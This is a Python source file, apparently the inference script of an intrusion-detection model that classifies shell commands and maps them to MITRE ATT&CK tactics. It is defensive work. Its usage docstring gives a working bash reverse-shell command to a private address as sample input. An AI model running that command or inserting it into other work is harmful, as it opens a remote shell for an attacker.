"""HyperIDs v2 本地推理入口。

用法：
    python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

输出三层：
  - 概率（verdict softmax / action sigmoid）
  - 决策（verdict argmax / action 阈值，支持 per-action 阈值）
  - MITRE tactic/technique（规则推导）
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import torch
from gliclass import GLiClassModel
from transformers import AutoTokenizer
from hyperids import schema

ROOT = Path(__file__).resolve().parents[1]
MODEL_DIR = ROOT / "model" / "checkpoints_gpu" / "final_model_v2"
THRESHOLDS_PATH = ROOT / "configs" / "action_thresholds.json"

IDS = schema.all_label_ids()
OFF = schema.group_offsets()
VERDICT = IDS[OFF["verdict"][0]: OFF["verdict"][1]]
ACTIONS = IDS[OFF["action"][0]: OFF["action"][1]]
DEFAULT_THRESHOLD = 0.5


class Predictor:
    def __init__(self, model_dir=MODEL_DIR, thresholds_path=THRESHOLDS_PATH, device=None):
        self.device = device or ("cuda" if torch.cuda.is_available() else "cpu")
        self.model = GLiClassModel.from_pretrained(str(model_dir)).to(self.device).eval()
        self.tokenizer = AutoTokenizer.from_pretrained(str(model_dir), add_prefix_space=True)
        tp = Path(thresholds_path)
        self.thresholds = json.loads(tp.read_text()) if tp.exists() else {}

    def _score_tokens(self, label_prefix_ids: list[int], cmd_ids: list[int]) -> dict[str, float]:
        """对 label 前缀 + 一段命令 token 做单次推理，返回 31 维 logit。"""
        ids = label_prefix_ids + cmd_ids + [self.tokenizer.sep_token_id]
        ids = ids[:512]
        input_ids = torch.tensor([ids], dtype=torch.long, device=self.device)
        attention_mask = torch.ones_like(input_ids)
        enc = {"input_ids": input_ids, "attention_mask": attention_mask}
        with torch.no_grad():
            out = self.model(**enc, max_num_classes=len(IDS))
        lg = out.logits.flatten()
        return {l: float(lg[j].item()) for j, l in enumerate(IDS)}

    def _scores(self, command: str) -> dict[str, float]:
        """分段扫描：超长命令滑动窗口，任一段命中恶意即算数。"""
        prefix = "".join(f"<<LABEL>>{l}" for l in IDS) + "<<SEP>>"
        label_prefix_ids = self.tokenizer(prefix, add_special_tokens=False)["input_ids"]
        cmd_ids = self.tokenizer(command, add_special_tokens=False)["input_ids"]
        avail = 512 - len(label_prefix_ids) - 1  # -1 for [SEP]

        if len(cmd_ids) <= avail:
            return self._score_tokens(label_prefix_ids, cmd_ids)

        # 超长：滑动窗口（窗口 120 token，重叠 30）
        window, stride = 120, 30
        segments = []
        start = 0
        while start < len(cmd_ids):
            segments.append(cmd_ids[start:start + window])
            if start + window >= len(cmd_ids):
                break
            start += window - stride
        # 尾部补一段（确保尾部不被漏）
        if len(cmd_ids) > window and segments[-1][-1] != cmd_ids[-1]:
            segments.append(cmd_ids[-window:])

        # action 取 max；verdict 取「恶意概率最高的段」
        merged = {l: -1e9 for l in IDS}
        best_verdict = None
        best_mal_prob = -1.0
        for seg in segments:
            sc = self._score_tokens(label_prefix_ids, seg)
            v_logits = [sc[v] for v in VERDICT]
            vp = torch.softmax(torch.tensor(v_logits), dim=0)
            mal_prob = float(vp[2].item())
            if mal_prob > best_mal_prob:
                best_mal_prob = mal_prob
                best_verdict = sc
            for a in ACTIONS:
                merged[a] = max(merged[a], sc[a])
        for v in VERDICT:
            merged[v] = best_verdict[v]  # verdict 用最恶意段的 logit
        return merged

    def predict(self, command: str) -> dict:
        scores = self._scores(command)
        # verdict: softmax over 3 mutually-exclusive logits
        v_logits = torch.tensor([scores[v] for v in VERDICT])
        v_probs = torch.softmax(v_logits, dim=0)
        verdict_probs = {v: round(float(v_probs[i].item()), 4) for i, v in enumerate(VERDICT)}
        verdict = max(VERDICT, key=lambda v: verdict_probs[v])
        # action: independent sigmoid probs + per-action threshold
        action_probs = {}
        actions = []
        for a in ACTIONS:
            p = float(torch.sigmoid(torch.tensor(scores[a])).item())
            action_probs[a] = round(p, 4)
            if p >= float(self.thresholds.get(a, DEFAULT_THRESHOLD)):
                actions.append(a)
        attck = schema.derive_attck(actions)
        return {
            "verdict": verdict,
            "verdict_probs": verdict_probs,
            "actions": actions,
            "action_probs": action_probs,
            "tactics": attck["tactics"],
            "techniques": attck["techniques"],
        }


def main():
    predictor = Predictor()
    cmds = sys.argv[1:]
    if not cmds:
        print("usage: python -m model.predict '<command>' [<command2> ...]")
        return
    for c in cmds:
        r = predictor.predict(c)
        print(f"\n{c}")
        print(f"  verdict   : {r['verdict']}  {r['verdict_probs']}")
        print(f"  actions   : {r['actions']}")
        print(f"  action_probs:")
        for a in ACTIONS:
            if r["action_probs"][a] >= 0.05 or a in r["actions"]:
                print(f"      {a:26s} {r['action_probs'][a]}")
        print(f"  tactics   : {r['tactics']}")
        print(f"  techniques: {r['techniques']}")


if __name__ == "__main__":
    main()
